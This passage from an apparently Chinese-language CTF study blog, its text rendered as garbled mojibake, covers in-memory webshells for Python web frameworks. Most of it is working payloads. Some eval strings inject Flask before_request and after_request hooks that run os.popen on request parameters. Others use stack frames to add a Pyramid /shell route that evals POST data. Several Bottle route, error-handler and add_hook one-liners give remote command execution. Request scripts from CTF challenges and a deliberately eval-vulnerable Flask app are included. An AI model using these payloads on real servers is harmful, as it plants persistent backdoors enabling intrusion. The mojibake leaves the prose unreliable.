class="comment"># type:Flask</span></span><br><span class="line">app.secret_key = <span class="string">&quot;DragonFire&quot;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.before_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.path == <span class="string">&quot;/login&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&quot;user&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/login&quot;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Login&quot;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/index&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Index&quot;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/home&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Login&quot;</span></span><br><span class="line"> </span><br><span class="line">app.run(<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20250417154155980.png" alt="image-20250417154155980"></p>
<p>æŸ¥çœ‹è¿™ä¸ªå®šä¹‰ å‘ç°</p>
<p><code>self.before_request_funcs.setdefault(None, []).append(f)</code></p>
<p>æ„æ€ï¼š<strong>å°†å‡½æ•° <code>f</code> æ³¨å†Œä¸ºå…¨å±€çš„ <code>before_request</code> é’©å­ï¼Œåœ¨æ¯æ¬¡è¯·æ±‚å¤„ç†å‰è‡ªåŠ¨è°ƒç”¨</strong>ã€‚</p>
<p>[é’©å­å‡½æ•°æ˜¯ä¸€ç§â€œæ’å…¥ç‚¹â€ï¼Œè®©ä½ åœ¨ç¨‹åºçš„æŸäº›å…³é”®æ—¶åˆ»æ‰§è¡Œè‡ªå®šä¹‰é€»è¾‘]</p>
<p>æ„æ€å°±æ˜¯æˆ‘ä»¬å¯ä»¥ä¼ å…¥ä¸€ä¸ªlambadaå‡½æ•°æ¥æ‰§è¡Œå‘½ä»¤ï¼<code>lambda :__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()</code></p>
<p>æ„é€ poc:<code>eval(&quot;__import__(&#39;sys&#39;).modules[&#39;__main__&#39;].__dict__[&#39;app&#39;].before_request_funcs.setdefault(None,[]).append(lambda :__import__(&#39;os&#39;).popen(&#39;dir&#39;).read())&quot;)</code></p>
<p>ï¼ï¼ï¼ï¼è¿™æ ·åœ¨æ¯æ¬¡responseä¹‹å‰éƒ½ä¼šæ‰§è¡Œlambadaå‡½æ•°æ¥æ‰§è¡Œå‘½ä»¤~~~</p>
<p>å°è¯•æœ¬åœ°èµ·æœåŠ¡</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, Response</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Home Page&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/e&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inject_memory_shell</span>():</span><br><span class="line">    cmd = request.args.get(<span class="string">&#x27;cmd&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># ä½¿ç”¨ eval åŠ¨æ€æ³¨å…¥ä»£ç </span></span><br><span class="line">        <span class="built_in">eval</span>(cmd)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Payload injected successfully&#x27;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;Error: <span class="subst">&#123;e&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">trigger_hook</span>():</span><br><span class="line">    <span class="keyword">pass</span>  <span class="comment"># æ‰€æœ‰æ³¨å…¥çš„ before_request éƒ½ä¼šè‡ªåŠ¨æ‰§è¡Œ</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20250417163201553.png" alt="image-20250417163201553"></p>
<p>éšæ„è®¿é—®ä¸€ä¸ªç›®å½• å¾—åˆ°</p>
<p><img src="/images/image-20250417163250131.png" alt="image-20250417163250131"></p>
<p>æ‰§è¡Œå‘½ä»¤æˆåŠŸå•¦ï¼å–œï¼</p>
<h4 id="app-after-request"><a href="#app-after-request" class="headerlink" title="@app.after_request"></a>@app.after_request</h4><p>åœ¨response(å“åº”)ä¹‹ååšå‡ºå“åº”</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.after_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foot_log</span>(<span class="params">environ</span>):</span><br><span class="line">    <span class="keyword">if</span> request.path != <span class="string">&quot;/login&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;æœ‰å®¢äººè®¿é—®äº†&quot;</span>,request.path)</span><br><span class="line">    <span class="keyword">return</span> environ</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20250417164109472.png" alt="image-20250417164109472"></p>
<p>è¿™é‡Œä¹Ÿæ˜¯å’Œå‰é¢çš„å·®ä¸å¤š ä½†æ˜¯è¦å®šä¹‰ä¸€ä¸ªè¿”å›å€¼ ä¸ç„¶ä¼šæŠ¥é”™</p>
<p><code>eval(&quot;app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#39;cmd&#39;) and exec(\&quot;global CmdResp;CmdResp=__import__(\&#39;flask\&#39;).make_response(__import__(\&#39;os\&#39;).popen(request.args.get(\&#39;cmd\&#39;)).read())\&quot;)==None else resp)&quot;)</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, make_response</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ³¨å…¥ç‚¹ï¼šå¯åŠ¨æ€æ³¨å…¥ payload</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/e&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inject_memory_shell</span>():</span><br><span class="line">    cmd = request.args.get(<span class="string">&#x27;cmd&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">eval</span>(cmd)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Payload injected successfully&#x27;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;Error: <span class="subst">&#123;e&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆå§‹é’©å­ï¼šå ä½</span></span><br><span class="line"><span class="meta">@app.after_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">default_after</span>(<span class="params">resp</span>):</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸»é¡µé¢</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Home Page&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20250417172055122.png" alt="image-20250417172055122"></p>
<p><img src="/images/image-20250417172224797.png" alt="image-20250417172224797"></p>
<p>bingo!æˆåŠŸ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">å‚è€ƒæ–‡ç« </span><br><span class="line">https://xz.aliyun.com/news/13858</span><br><span class="line">https://www.cnblogs.com/gxngxngxn/p/18181936</span><br><span class="line">https://research.qianxin.com/archives/2329</span><br><span class="line">https://blog.csdn.net/solitudi/article/details/115331388</span><br></pre></td></tr></table></figure>

<h3 id="Pyamidå†…å­˜é©¬"><a href="#Pyamidå†…å­˜é©¬" class="headerlink" title="Pyamidå†…å­˜é©¬"></a>Pyamidå†…å­˜é©¬</h3><p>ä¾‹é¢˜è¯¦è§ TGCTF20245 ç†Ÿæ‚‰çš„é…æ–¹* æˆ–è€… å¼ºç½‘æ¯å†³èµ›Pyramid</p>
<h3 id="åˆ©ç”¨æ ˆå¸§æ‰“Pyramid-WEBæ¡†æ¶ä¸‹çš„å†…å­˜é©¬"><a href="#åˆ©ç”¨æ ˆå¸§æ‰“Pyramid-WEBæ¡†æ¶ä¸‹çš„å†…å­˜é©¬" class="headerlink" title="åˆ©ç”¨æ ˆå¸§æ‰“Pyramid WEBæ¡†æ¶ä¸‹çš„å†…å­˜é©¬"></a>åˆ©ç”¨æ ˆå¸§æ‰“Pyramid WEBæ¡†æ¶ä¸‹çš„å†…å­˜é©¬</h3><h4 id="æ ˆå¸§"><a href="#æ ˆå¸§" class="headerlink" title="æ ˆå¸§"></a>æ ˆå¸§</h4><p>ä¸æ‡‚å¾—è¯¦æƒ…çœ‹:<a target="_blank" rel="noopener" href="https://blog.csdn.net/Jesse_Kyrie/article/details/139789665">https://blog.csdn.net/Jesse_Kyrie/article/details/139789665</a></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ ˆå¸§ï¼ˆStack Frameï¼‰æ˜¯ Python è™šæ‹Ÿæœº ä¸­ç¨‹åºæ‰§è¡Œçš„è½½ä½“ä¹‹ä¸€ï¼Œä¹Ÿæ˜¯ Python ä¸­çš„ä¸€ç§æ‰§è¡Œä¸Šä¸‹æ–‡ã€‚ æ¯å½“ Python æ‰§è¡Œä¸€ä¸ªå‡½æ•°æˆ–æ–¹æ³•æ—¶ï¼Œéƒ½ä¼šåˆ›å»ºä¸€ä¸ªæ ˆå¸§æ¥è¡¨ç¤ºå½“å‰çš„å‡½æ•°è°ƒç”¨ï¼Œå¹¶å°†å…¶å‹å…¥ä¸€ä¸ªç§°ä¸º è°ƒç”¨æ ˆ ï¼ˆCall Stackï¼‰çš„æ•°æ®ç»“æ„ä¸­ã€‚ è°ƒç”¨æ ˆæ˜¯ä¸€ä¸ªåè¿›å…ˆå‡ºï¼ˆLIFOï¼‰çš„æ•°æ®ç»“æ„ï¼Œç”¨äºç®¡ç†ç¨‹åºä¸­çš„å‡½æ•°è°ƒç”¨å…³ç³»ã€‚ æ ˆå¸§çš„åˆ›å»ºå’Œé”€æ¯æ˜¯åŠ¨æ€çš„ï¼Œéšç€å‡½æ•°çš„è°ƒç”¨å’Œè¿”å›è€Œä¸æ–­å‘ç”Ÿ</span><br></pre></td></tr></table></figure>

<h4 id="æ„é€ å†…å­˜é©¬"><a href="#æ„é€ å†…å­˜é©¬" class="headerlink" title="æ„é€ å†…å­˜é©¬"></a>æ„é€ å†…å­˜é©¬</h4><p>Pyramid WEBæ–°æ¡†æ¶ä¸‹çš„å†…å­˜é©¬å‘ç°æ˜¯é€šè¿‡pyramid.configæ¥ç”Ÿæˆçš„ï¼Œå› ä¸ºpyramid.configé‡Œæœ‰add_view add_routeï¼Œå¯ä»¥ç”¨æ¥æ³¨å†Œè·¯ç”±ã€‚</p>
<p>æ‰€ä»¥æˆ‘ä»¬è¦é‚£åˆ°è¿™ä¸ªconfigï¼Œæ‰€ä»¥å¾—è·å–åˆ°<strong>æ ˆå¸§çš„globalså…¨å±€</strong>æ‰èƒ½æ‹¿åˆ°å½“å‰çš„<strong>app config</strong>ã€‚</p>
<p>å…ˆçœ‹ä¸‹é¢è¿™æ®µä»£ç ï¼Œè¿™ä¸ªå°±æ˜¯ä¸ºäº†è·å–configé‚£ä¸ªæ ˆå¸§</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">g = f()             </span><br><span class="line">frame = <span class="built_in">next</span>(g)     </span><br><span class="line">b = frame.f_back.f_back.f_globals</span><br><span class="line"><span class="built_in">print</span>(b)</span><br></pre></td></tr></table></figure>

<p>ç„¶åæ‹¿åˆ°è¿™ä¸ªæ ˆå¸§è¿‡å å°±è®¿é—®configæ·»åŠ æ–°è·¯ç”±äº†</p>
<p>ä¸‹é¢å®šä¹‰äº†ä¸€ä¸ªæ–°helloå‡½æ•° </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>(<span class="params">request</span>):        </span><br><span class="line">    code = request.POST[<span class="string">&#x27;code&#x27;</span>]       </span><br><span class="line">    res=<span class="built_in">eval</span>(code)        </span><br><span class="line">    <span class="keyword">return</span> Response(res)  </span><br><span class="line">    config.add_route(<span class="string">&#x27;shell&#x27;</span>, <span class="string">&#x27;/shell&#x27;</span>)    <span class="comment">#æ·»åŠ æ–°è·¯ç”±</span></span><br><span class="line">    config.add_view(hello, route_name=<span class="string">&#x27;shell&#x27;</span>)    <span class="comment">#ç»™/shellè·¯ç”±ç»‘å®šè§†å›¾hello</span></span><br><span class="line">    config.commit()      <span class="comment">#ç«‹å³æ›´æ–°æœåŠ¡ è€Œä¸æ˜¯æ‰‹åŠ¨é‡å¯ è¿™æ ·æ‰èƒ½å¤Ÿç”Ÿæ•ˆ</span></span><br></pre></td></tr></table></figure>

<p>æ•´åˆä¸€ä¸‹payloadå°±æ˜¯</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():        <span class="keyword">yield</span> g.gi_frame.f_back  </span><br><span class="line">    g = f()    frame = <span class="built_in">next</span>(g)       </span><br><span class="line">    b = frame.f_back.f_back.f_globals  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">hello</span>(<span class="params">request</span>):        code = request.POST[<span class="string">&#x27;code&#x27;</span>]        res=<span class="built_in">eval</span>(code)        <span class="keyword">return</span> Response(res)  </span><br><span class="line">    config.add_route(<span class="string">&#x27;shell&#x27;</span>, <span class="string">&#x27;/shell&#x27;</span>)    config.add_view(hello, route_name=<span class="string">&#x27;shellb&#x27;</span>)    config.commit()  </span><br><span class="line">waff() </span><br></pre></td></tr></table></figure>

<p>TGCTF2025 ç†Ÿæ‚‰*</p>
<p>payloadå†™æ³•</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line">code=<span class="string">&#x27;&#x27;&#x27;def waff():</span></span><br><span class="line"><span class="string">    def f():</span></span><br><span class="line"><span class="string">        yield g.gi_frame.f_back</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    g = f()             </span></span><br><span class="line"><span class="string">    frame = next(g)     </span></span><br><span class="line"><span class="string">    b = frame.f_back.f_back.f_globals</span></span><br><span class="line"><span class="string">    def hello(request):</span></span><br><span class="line"><span class="string">        code = request.params[&#x27;code&#x27;]</span></span><br><span class="line"><span class="string">        res=eval(code)</span></span><br><span class="line"><span class="string">        return Response(res)</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    config.add_route(&#x27;shellb&#x27;, &#x27;/shellb&#x27;)</span></span><br><span class="line"><span class="string">    config.add_view(hello, route_name=&#x27;shellb&#x27;)</span></span><br><span class="line"><span class="string">    config.commit()</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">waff()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">url=<span class="string">&quot;YOUR_URL&quot;</span></span><br><span class="line">data=&#123;<span class="string">&quot;expr&quot;</span>:<span class="string">f&quot;<span class="subst">&#123;code&#125;</span>+111&quot;</span>&#125;</span><br><span class="line">res=requests.post(url=url,data=data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>

<p>å¼ºç½‘æ¯pyramidè„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line">code=<span class="string">&#x27;&#x27;&#x27;def waff():</span></span><br><span class="line"><span class="string">    def f():</span></span><br><span class="line"><span class="string">        yield g.gi_frame.f_back</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    g = f()             </span></span><br><span class="line"><span class="string">    frame = next(g)     </span></span><br><span class="line"><span class="string">    b = frame.f_back.f_back.f_globals</span></span><br><span class="line"><span class="string">    print(b)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">waff()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">code1=<span class="string">&quot;print(1)&quot;</span></span><br><span class="line">burp0_url = <span class="string">&quot;http://127.0.0.1:6543/api/test?code=&quot;</span>+code+<span class="string">&quot;&amp;token=eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJwYXNzd29yZCI6ICIxMjM0NTYifQ%3D%3D.Z5LpNETpFxdzqwhuSwp762ebRWcYzKBWCL5zrymkRlSJ4Lvl%2BAysBf1d8NIRmFQRJ0P3ceKEpn7rGGUpICNmQ9yYf77FHJcVX2hJQ4YodabxiavEMlgYkeDelNPgmohkG%2F3sk8CqPKkY41cRlhVrBPZJn2AInLkEIyW5yt1CRo0NWDndTl4v6eRTu3JtG9FXUs3O8hzeuqBsnzDS%2Fih3dEzWXzGxj%2B90UOOPDlJdnaBj22b4oIoMKVbYNuJFkAjqbCW8dVdLxX35VVonnFW5VfJ7tcepTt1irmtnL%2FEgVb94yqAr3YtJRSIRHJr79t46PLs8bpG9m3kOjtwtxrUz9g%3D%3D.UlM%3D.LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFwemJKUWRqWlEyL3pGeFVZc2I2YQo4YnljREhtSzQ2QXpaa25aQXJxMFFKekE5Ri9EWXFxRk5KanpTeHk0WmZqbmk4TlprRmduM2REWXdCU0JUWjZKClc3VW1waWVDZXcza3o5cy9GMENRdUxCY0dKMTd0M2RPVWRRVVpSVnJXUkhBeE1aL0Y2VFFSUWMvUkFVQy9qRmUKWGVYWTBIeFFydyt6amVJeWNCNlcyeGdZUDlxU0RXNHZYeWFrb1pRZXZiZmhHc3dVQWU3Vm5jQ3FuYnBPZk5tZQphZXdwRTd0b3NoSWpOSWFiN3d5RW9zQzY0RGhGU2tsNS9qZ0ZyVFVheC84OERueDJzYzgzL3hHWFVyY0tDajB3CmdQRVhmTFdGc2NLbzRtdzFNaHhGWE5SZEZDdDFHMVM3eTd6WkdESklQRXhQbEFJSE05RzNSWFd5WDlXbm5xUzQKSlFJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t&quot;</span></span><br><span class="line">burp0_headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;Sec-Fetch-Dest&quot;</span>: <span class="string">&quot;document&quot;</span>, <span class="string">&quot;Sec-Fetch-Mode&quot;</span>: <span class="string">&quot;navigate&quot;</span>, <span class="string">&quot;Sec-Fetch-Site&quot;</span>: <span class="string">&quot;none&quot;</span>, <span class="string">&quot;Sec-Fetch-User&quot;</span>: <span class="string">&quot;?1&quot;</span>, <span class="string">&quot;Priority&quot;</span>: <span class="string">&quot;u=0, i&quot;</span>&#125;</span><br><span class="line">res=requests.get(burp0_url, headers=burp0_headers)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>

<h3 id="bottleå†…å­˜é©¬"><a href="#bottleå†…å­˜é©¬" class="headerlink" title="bottleå†…å­˜é©¬"></a>bottleå†…å­˜é©¬</h3><p>å‚è€ƒæ–‡ç« :<a target="_blank" rel="noopener" href="https://forum.butian.net/share/4048">https://forum.butian.net/share/4048</a></p>
<p>è¿™é‡Œç›´æ¥è®°å½•å‡ ç§åšæ³•</p>
<h4 id="1-ç›´æ¥ç»‘å®šè·¯ç”±"><a href="#1-ç›´æ¥ç»‘å®šè·¯ç”±" class="headerlink" title="1.ç›´æ¥ç»‘å®šè·¯ç”±"></a>1.ç›´æ¥ç»‘å®šè·¯ç”±</h4><p>payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">app.route(<span class="string">&quot;/b&quot;</span>,<span class="string">&quot;GET&quot;</span>,<span class="keyword">lambda</span> :<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(request.params.get(<span class="string">&#x27;a&#x27;</span>)).read()) <span class="comment">#ç›´æ¥è®¿é—®/bè·¯ç”± aå‚æ•°å¯ä»¥è¿›è¡Œrce</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="2-åˆ©ç”¨æŠ¥é”™ç•Œé¢-æ±¡æŸ“æŠ¥é”™ç•Œé¢"><a href="#2-åˆ©ç”¨æŠ¥é”™ç•Œé¢-æ±¡æŸ“æŠ¥é”™ç•Œé¢" class="headerlink" title="2.åˆ©ç”¨æŠ¥é”™ç•Œé¢ æ±¡æŸ“æŠ¥é”™ç•Œé¢"></a>2.åˆ©ç”¨æŠ¥é”™ç•Œé¢ æ±¡æŸ“æŠ¥é”™ç•Œé¢</h4><p>payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.error(<span class="number">404</span>)(<span class="keyword">lambda</span> e: <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(request.query.get(<span class="string">&#x27;a&#x27;</span>)).read())</span><br></pre></td></tr></table></figure>

<h4 id="3-åˆ©ç”¨add-hook"><a href="#3-åˆ©ç”¨add-hook" class="headerlink" title="3.åˆ©ç”¨add_hook"></a>3.åˆ©ç”¨add_hook</h4><p>add_hookå°±æ˜¯æ³¨å†Œé’©å­å‡½æ•°</p>
<p><img src="/images/image-20250418134610602.png" alt="image-20250418134610602"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#reaponse</span></span><br><span class="line">app.add_hook(<span class="string">&#x27;before_request&#x27;</span>, <span class="keyword">lambda</span>: <span class="built_in">__import__</span>(<span class="string">&#x27;bottle&#x27;</span>).response.set_header(<span class="string">&#x27;X-flag&#x27;</span>, <span class="built_in">__import__</span>(<span class="string">&#x27;base64&#x27;</span>).b64encode(<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(request.query.get(<span class="string">&#x27;a&#x27;</span>)).read().encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#abort</span></span><br><span class="line">app.add_hook(<span class="string">&#x27;before_request&#x27;</span>, <span class="keyword">lambda</span>: <span class="built_in">__import__</span>(<span class="string">&#x27;bottle&#x27;</span>).abort(<span class="number">404</span>,<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(request.query.get(<span class="string">&#x27;a&#x27;</span>)).read()))</span><br></pre></td></tr></table></figure>

<h2 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h2><p>å­¦ä¹ pythonå†…å­˜é©¬å…ˆå‘Šä¸€æ®µè½äº† æœ‰å¾ˆå¤šå…¶ä»–æ¨¡æ¿çš„å†…å­˜é©¬ ä»¥åé‡åˆ°äº†å†æ¥è¡¥å…¨å§~~~</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/04/14/TGCTF2025-WEB/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/2.png">
      <meta itemprop="name" content="Sauy">
      <meta itemprop="description" content="VENI,VEDI,VICI">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sauy's corner">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/04/14/TGCTF2025-WEB/" class="post-title-link" itemprop="url">TGCTF2025-WEB WP</a>
        </h2>

